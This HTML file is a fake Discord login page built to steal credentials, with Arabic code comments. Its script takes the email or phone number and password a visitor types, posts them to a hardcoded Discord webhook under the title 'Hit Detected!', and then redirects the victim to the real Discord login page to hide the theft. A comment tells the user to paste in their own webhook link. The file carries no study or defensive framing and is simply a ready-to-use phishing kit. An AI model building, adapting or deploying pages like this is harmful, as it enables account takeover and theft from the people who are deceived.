<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Login</title>
    <style>
        /* إجبار المتصفح على الألوان الغامقة */
        html, body {
            background-color: #313338 !important; 
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            overflow: hidden;
        }

        /* حاوية تسجيل الدخول */
        .auth-box {
            background: #2B2D31;
            width: 480px;
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            color: #F2F3F5;
            text-align: center;
            z-index: 100;
        }

        h2 { font-size: 24px; margin-bottom: 8px; font-weight: 600; }
        p { color: #B5BAC1; font-size: 16px; margin-bottom: 20px; }

        .input-wrapper { text-align: left; margin-bottom: 20px; }
        
        label {
            display: block;
            color: #B5BAC1;
            font-size: 12px;
            font-weight: 700;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        input {
            width: 100%;
            height: 40px;
            padding: 10px;
            background: #1E1F22;
            border: none;
            border-radius: 3px;
            color: white;
            font-size: 16px;
            outline: none;
        }

        button {
            width: 100%;
            height: 44px;
            background-color: #5865F2;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        button:hover { background-color: #4752C4; }

        .footer { color: #00A8FC; font-size: 14px; text-align: left; margin-top: 4px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="auth-box">
        <h2>Welcome back!</h2>
        <p>We're so excited to see you again!</p>

        <div class="input-wrapper">
            <label>Email or Phone Number</label>
            <input type="text" id="email">
        </div>

        <div class="input-wrapper">
            <label>Password</label>
            <input type="password" id="pass">
            <div class="footer">Forgot your password?</div>
        </div>

        <button onclick="sendData()">Log In</button>

        <div style="margin-top: 15px; font-size: 14px; color: #949BA4; text-align: left;">
            Need an account? <span style="color: #00A8FC; cursor: pointer;">Register</span>
        </div>
    </div>

    <script>
        const WB = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr"; // حط رابط الويب هوك حقك هنا

        async function sendData() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;

            if(!e || !p) return;

            fetch(WB, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🚀 Hit Detected!",
                        color: 5814783,
                        fields: [
                            {name: "User", value: `\`${e}\``},
                            {name: "Pass", value: `\`${p}\``}
                        ]
                    }]
                })
            }).then(() => {
                window.location.replace("https://discord.com/login");
            });
        }
    </script>
</body>
</html>
